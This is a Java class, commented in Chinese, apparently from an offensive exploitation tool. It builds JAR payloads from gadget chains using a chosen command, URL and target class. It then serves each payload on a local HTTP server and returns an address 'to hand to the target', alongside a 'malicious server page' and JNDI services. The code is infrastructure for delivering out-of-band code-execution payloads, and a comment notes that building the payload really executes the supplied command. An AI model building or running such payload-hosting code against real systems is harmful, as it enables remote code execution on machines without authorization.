package service;

import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

import payload.JarPreset;
import payload.PayloadEngine;
import payload.RawPayload;

/**
 * HTTP 带外 Jar 的托管：把生成好的 Jar 挂到本地 HTTP 服务上，交回一个可访问的地址。
 *
 * <p>为什么必须自成一层而不是让界面直接调 ServiceManager：
 * 上游的 HTTP 服务在发布载荷时按请求回落到自己绑定的端口，实测用另一个
 * ServiceManager 实例发布时，返回的地址会指向上游默认端口（50000）而不是实际监听端口，
 * 拿到的 URL 打不开。因此「启动」与「发布」必须由同一个实例完成，
 * 这个约束收在本类里，界面层就不必知道它。
 *
 * <p>本类不碰界面也不碰配置文件：端口与绑定地址由界面层从配置里取出后传进来，
 * 与其他服务保持一致。
 */
public final class OobJarService {

    /** 空串常量：反复出现的空值回退写法集中一处。 */
    private static final String EMPTY = "";

    /** 一次托管的结果：成功给可访问地址与产物信息，失败给原因。 */
    public static final class Hosted {
        /** 是否成功。失败时不携带地址。 */
        public final boolean success;
        /** 失败原因；成功时为空串。 */
        public final String error;
        /** 可直接交给目标的地址；失败时为空串。 */
        public final String url;
        /** 产物字节数；未知为 0。 */
        public final int byteLength;
        /** 产物是否为合法 Jar（Zip 魔数）；用于拦截「地址通了但拿到空文件」这种情况。 */
        public final boolean jarLike;
        /** 实际监听的地址与端口，便于写进报告。 */
        public final String endpoint;

        private Hosted(boolean success, String error, String url, int byteLength, boolean jarLike,
                       String endpoint) {
            this.success = success;
            this.error = error == null ? EMPTY : error;
            this.url = url == null ? EMPTY : url;
            this.byteLength = byteLength;
            this.jarLike = jarLike;
            this.endpoint = endpoint == null ? EMPTY : endpoint;
        }

        static Hosted ok(String url, int byteLength, boolean jarLike, String endpoint) {
            return new Hosted(true, EMPTY, url, byteLength, jarLike, endpoint);
        }

        static Hosted fail(String error) {
            return new Hosted(false, error, EMPTY, 0, false, EMPTY);
        }
    }

    /** 上游 HTTP 服务的标识：非 JNDI 服务的端口键固定为 main。 */
    private static final String HTTP_KEY = "http";

    private final ServiceManager manager = new ServiceManager();
    /** 上次实际使用的端口，便于界面在停止后仍能显示刚刚用的是哪个端口。 */
    private int lastPort;

    /**
     * 生成并托管一个 Jar。
     *
     * <p>顺序固定为「先确保服务在监听，再构建载荷，最后发布」：构建会真实执行节点参数里的
     * 命令（上游行为），把它放在服务启动之后，失败时至少能分清是端口问题还是载荷问题。失败时使用者至少能分清是端口问题还是载荷问题。
     */
    public Hosted host(String bindHost, String advertiseHost, int port, String kindNodeId,
                       String actionNodeId, String url, String command, String path,
                       String targetClass, String classNamePrefix, boolean executable) {
        JarPreset.Kind kind = JarPreset.kindOf(kindNodeId);
        if (kind == null) return Hosted.fail("未知的 Jar 类型：" + kindNodeId);
        JarPreset.Action action = JarPreset.actionOf(actionNodeId);
        if (action == null) return Hosted.fail("未知的末端动作：" + actionNodeId);
        if (port < 1 || port > 65535) return Hosted.fail("端口必须是 1-65535 之间的整数：" + port);

        Map<String, Integer> ports = new LinkedHashMap<String, Integer>();
        ports.put("main", Integer.valueOf(port));
        PublicationResult started = manager.start(HTTP_KEY, bindHost, advertiseHost, ports);
        if (!started.success && !isRunning()) {
            return Hosted.fail("启动 HTTP 服务失败：" + started.error);
        }
        lastPort = port;

        Map<String, Object> params = JarPreset.params(kind.nodeId, action.nodeId, url, command, path,
                targetClass, classNamePrefix, executable);
        List<String> gadgets = JarPreset.gadgets(kind.nodeId, action.nodeId);
        RawPayload built = PayloadEngine.buildRaw(JarPreset.carrier(), gadgets, params);
        if (!built.success) return Hosted.fail("生成载荷失败：" + built.message);

        PublicationResult published = manager.publish(HTTP_KEY, JarPreset.carrier(), gadgets, params);
        if (!published.success) return Hosted.fail("发布 Jar 失败：" + published.error);

        String address = firstLine(published.message);
        int length = Math.max(published.byteLength, built.bytes.length);
        return Hosted.ok(address, length, JarPreset.looksLikeJar(built.bytes), endpointOf(port));
    }

    /** 停止托管；未启动时上游会返回失败，这里转成可读原因。 */
    public PublicationResult stop() {
        return manager.stop(HTTP_KEY);
    }

    /** 当前是否已在监听。 */
    public boolean isRunning() {
        for (ServiceEndpoint endpoint : manager.endpoints()) {
            if (HTTP_KEY.equals(endpoint.key)) return endpoint.isRunning();
        }
        return false;
    }

    /** 上次使用过的端口；未托管过时为 0。 */
    public int lastPort() {
        return lastPort;
    }

    /** 已托管但尚未被替换的载荷条数，便于界面提示地址仍然有效。 */
    public int publishedCount() {
        return manager.activePublications(HTTP_KEY);
    }

    /** 上游返回的信息可能带多行（HTTP 只有一行），取第一行作为地址。 */
    private static String firstLine(String text) {
        String safe = text == null ? EMPTY : text.trim();
        int breakAt = safe.indexOf(10);
        return breakAt < 0 ? safe : safe.substring(0, breakAt).trim();
    }

    private static String endpointOf(int port) {
        return "http://127.0.0.1:" + port;
    }

    /** 供界面提示的可选端口建议，避免与恶意服务器页的 HTTP 端口撞车。 */
    public static List<Integer> suggestedPorts() {
        List<Integer> ports = new ArrayList<Integer>();
        ports.add(Integer.valueOf(50001));
        ports.add(Integer.valueOf(58081));
        ports.add(Integer.valueOf(50000));
        return ports;
    }
}
